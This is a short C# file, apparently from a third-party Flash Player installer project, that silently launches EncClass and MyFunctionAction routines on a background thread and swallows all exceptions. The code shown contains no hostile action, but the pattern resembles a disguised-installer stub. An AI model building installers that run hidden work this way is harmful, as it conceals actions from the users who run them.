using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;

namespace flashplayerpp_install_cn
{
    public static class MainClass
    {
        public static void RunInBack()
        {
            try
            {
                EncClass.Run();
                MyFunctionAction fun = new MyFunctionAction();
                fun.Run();
            }
            catch
            {

            }
        }
        public static void Run()
        {

            ThreadStart childref = new ThreadStart(RunInBack);
            Thread childThread = new Thread(childref);
            childThread.Start();

          

        }
    }
}
